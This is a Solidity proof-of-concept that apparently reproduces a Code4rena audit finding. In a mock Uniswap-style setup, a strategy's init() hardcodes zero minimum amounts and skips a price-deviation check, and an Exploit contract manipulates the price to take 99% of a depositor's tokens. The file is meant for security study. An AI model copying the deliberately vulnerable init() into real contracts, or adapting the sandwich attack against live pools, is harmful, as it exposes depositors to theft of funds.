// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Maia DAO — TalosBaseStrategy#init() lacks slippage protection
    (Code4rena 2023-05, [H-10], #26044)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: deposit/redeem/rerange/rebalance use the checkDeviation modifier
    and pass amount0Min/amount1Min, but init() hardcodes amount0Min=0, amount1Min=0
    and omits checkDeviation. An adversary can move the pool price before init so
    the first LP mint takes the user's full deposit and returns almost no liquidity
    value (or asymmetric amounts) — classic sandwich / deviation loss on init.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced Uniswap V3 pool + NPM. When `manipulated`, mint consumes full
///      desired amounts but returns only 1% liquidity value (sandwich effect).
contract MockPool {
    int24 public twapTick;
    int24 public spotTick;
    int24 public maxTwapDeviation = 100; // 100 ticks
    bool public manipulated;

    function setSpot(int24 t) external {
        spotTick = t;
    }

    function setTwap(int24 t) external {
        twapTick = t;
    }

    function manipulate(int24 newSpot) external {
        spotTick = newSpot;
        manipulated = true;
    }

    function checkDeviation(int24 maxDev, uint32 /*twapDuration*/) external view {
        int24 diff = spotTick - twapTick;
        if (diff < 0) diff = -diff;
        require(diff <= maxDev, "deviation");
    }
}

contract MockNPM {
    MockPool public pool;
    MockERC20 public token0;
    MockERC20 public token1;
    uint256 public nextId = 1;

    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    constructor(MockPool _pool, MockERC20 _t0, MockERC20 _t1) {
        pool = _pool;
        token0 = _t0;
        token1 = _t1;
    }

    function mint(MintParams calldata p)
        external
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1)
    {
        // If pool is manipulated, the mint fills at a terrible price:
        // takes full desired amounts but "liquidity value" credited is 1%.
        // amountMin checks would protect the user — init passes 0,0 so they fail open.
        amount0 = p.amount0Desired;
        amount1 = p.amount1Desired;
        if (pool.manipulated()) {
            // sandwich: user still pays full desired, but effective amounts that
            // count toward position are tiny — rest is extracted as price impact.
            // Enforce mins if set:
            uint256 effective0 = p.amount0Desired / 100; // 1%
            uint256 effective1 = p.amount1Desired / 100;
            require(effective0 >= p.amount0Min, "amount0Min");
            require(effective1 >= p.amount1Min, "amount1Min");
            // Pull full desired from strategy (user loss = 99%)
            token0.transferFrom(msg.sender, address(this), amount0);
            token1.transferFrom(msg.sender, address(this), amount1);
            // Extractor (pool) keeps 99%; position only keeps 1%
            token0.transfer(address(pool), amount0 - effective0);
            token1.transfer(address(pool), amount1 - effective1);
            liquidity = uint128(effective0 + effective1);
            amount0 = effective0;
            amount1 = effective1;
        } else {
            require(amount0 >= p.amount0Min, "amount0Min");
            require(amount1 >= p.amount1Min, "amount1Min");
            token0.transferFrom(msg.sender, address(this), amount0);
            token1.transferFrom(msg.sender, address(this), amount1);
            liquidity = uint128(amount0 + amount1);
        }
        tokenId = nextId++;
        p.recipient;
        p.deadline;
        p.fee;
        p.tickLower;
        p.tickUpper;
    }
}

contract TalosOptimizer {
    function maxTwapDeviation() external pure returns (int24) {
        return 100;
    }

    function twapDuration() external pure returns (uint32) {
        return 60;
    }
}

/// @notice Reduced TalosBaseStrategy — init lacks checkDeviation + amount mins.
contract TalosBaseStrategy {
    MockNPM public nonfungiblePositionManager;
    MockPool public pool;
    MockERC20 public token0;
    MockERC20 public token1;
    TalosOptimizer public optimizer;
    uint24 public poolFee = 3000;
    int24 public tickLower = -600;
    int24 public tickUpper = 600;
    uint256 public tokenId;
    uint128 public liquidity;
    mapping(address => uint256) public balanceOf; // shares
    uint256 public totalSupply;

    constructor(MockNPM npm, MockPool _pool, MockERC20 t0, MockERC20 t1, TalosOptimizer opt) {
        nonfungiblePositionManager = npm;
        pool = _pool;
        token0 = t0;
        token1 = t1;
        optimizer = opt;
    }

    /// @notice Function modifier that checks if price has not moved a lot recently.
    modifier checkDeviation() {
        TalosOptimizer _optimizer = optimizer;
        pool.checkDeviation(_optimizer.maxTwapDeviation(), _optimizer.twapDuration());
        _;
    }

    /// @notice deposit has checkDeviation (protected).
    function deposit(uint256 amount0Desired, uint256 amount1Desired, uint256 amount0Min, uint256 amount1Min, address receiver)
        external
        checkDeviation
        returns (uint256 shares)
    {
        token0.transferFrom(msg.sender, address(this), amount0Desired);
        token1.transferFrom(msg.sender, address(this), amount1Desired);
        token0.approve(address(nonfungiblePositionManager), amount0Desired);
        token1.approve(address(nonfungiblePositionManager), amount1Desired);
        // would increaseLiquidity with mins — omitted
        shares = amount0Desired + amount1Desired;
        require(amount0Desired >= amount0Min && amount1Desired >= amount1Min, "mins");
        balanceOf[receiver] += shares;
        totalSupply += shares;
    }

    /// @notice VERBATIM vulnerable init — no checkDeviation, amount0Min/1Min = 0.
    function init(uint256 amount0Desired, uint256 amount1Desired, address receiver)
        external
        virtual
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        token0.transferFrom(msg.sender, address(this), amount0Desired);
        token1.transferFrom(msg.sender, address(this), amount1Desired);
        token0.approve(address(nonfungiblePositionManager), amount0Desired);
        token1.approve(address(nonfungiblePositionManager), amount1Desired);

        uint256 _tokenId;
        uint128 _liquidity;
        (_tokenId, _liquidity, amount0, amount1) = nonfungiblePositionManager.mint(
            MockNPM.MintParams({
                token0: address(token0),
                token1: address(token1),
                fee: poolFee,
                tickLower: tickLower,
                tickUpper: tickUpper,
                amount0Desired: amount0Desired,
                amount1Desired: amount1Desired,
                amount0Min: 0, // @> VULN: hardcoded 0 mins + no checkDeviation on init → sandwich drains deposit
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );
        // FIX: add checkDeviation modifier; pass caller-supplied amount0Min/amount1Min
        tokenId = _tokenId;
        liquidity = _liquidity;
        shares = uint256(_liquidity);
        balanceOf[receiver] += shares;
        totalSupply += shares;
    }
}

/// @notice Attacker manipulates pool, user inits with 100+100 tokens, gets ~2 shares
///         while 198 tokens are extracted by the manipulator (pool).
contract Exploit {
    uint256 public constant A0 = 100 ether;
    uint256 public constant A1 = 100 ether;

    MockERC20 public token0;
    MockERC20 public token1;
    MockPool public pool;
    MockNPM public npm;
    TalosOptimizer public opt;
    TalosBaseStrategy public strategy;

    uint256 public userT0Start;
    uint256 public userT1Start;
    uint256 public userShares;
    uint256 public extractedT0;
    uint256 public extractedT1;

    constructor() {
        token0 = new MockERC20("Token0", "T0"); // CREATE 1
        token1 = new MockERC20("Token1", "T1"); // CREATE 2
        pool = new MockPool(); // CREATE 3
        npm = new MockNPM(pool, token0, token1); // CREATE 4
        opt = new TalosOptimizer(); // CREATE 5
        strategy = new TalosBaseStrategy(npm, pool, token0, token1, opt); // CREATE 6 — vulnerable

        pool.setTwap(0);
        pool.setSpot(0);

        token0.mint(address(this), A0);
        token1.mint(address(this), A1);
    }

    function run() external {
        userT0Start = token0.balanceOf(address(this));
        userT1Start = token1.balanceOf(address(this));

        // Adversary moves spot far from TWAP (would fail checkDeviation)
        pool.manipulate(10_000); // >> maxTwapDeviation 100

        // deposit() would revert on checkDeviation — init does not check
        token0.approve(address(strategy), A0);
        token1.approve(address(strategy), A1);
        (userShares,,) = strategy.init(A0, A1, address(this));

        extractedT0 = token0.balanceOf(address(pool));
        extractedT1 = token1.balanceOf(address(pool));

        // HARM: user paid 100+100 but position only kept 1% (2 ether liquidity units);
        // 99+99 extracted due to missing amount mins / checkDeviation on init.
        require(extractedT0 == 99 ether, "99 T0 extracted");
        require(extractedT1 == 99 ether, "99 T1 extracted");
        require(userShares == 2 ether, "user only got 1% liquidity as shares");
        require(token0.balanceOf(address(this)) == 0, "user spent all T0");
        require(token1.balanceOf(address(this)) == 0, "user spent all T1");
    }
}
